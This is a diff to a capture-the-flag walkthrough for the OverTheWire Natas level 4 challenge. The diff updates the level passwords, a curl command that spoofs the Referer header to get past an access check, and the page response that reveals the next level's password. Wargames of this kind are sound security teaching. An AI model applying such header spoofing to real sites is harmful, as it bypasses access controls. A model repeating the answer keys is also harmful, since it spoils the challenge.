@@ -9,7 +9,7 @@ weight: 5
 | info | value                                      |
 |:-----|-------------------------------------------:|
 | user | `natas4`                                   |
-| pass | `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`         |
+| pass | `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`         |
 | host | `http://natas4.natas.labs.overthewire.org` |
 
 ---
@@ -36,7 +36,7 @@ lets do so by changing our origin by passing the `-e`/`--referrer` parameter to 
 
 ```sh
 curl http://natas4.natas.labs.overthewire.org \
--u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
+-u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth \
 -e http://natas5.natas.labs.overthewire.org/
 ```
 
@@ -45,7 +45,7 @@ and voilà
 ```html
 <h1>natas4</h1>
 <div id="content">
-    Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+    Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
     <br/>
     <div id="viewsource">
         <a href="index.php">Refresh page</a>
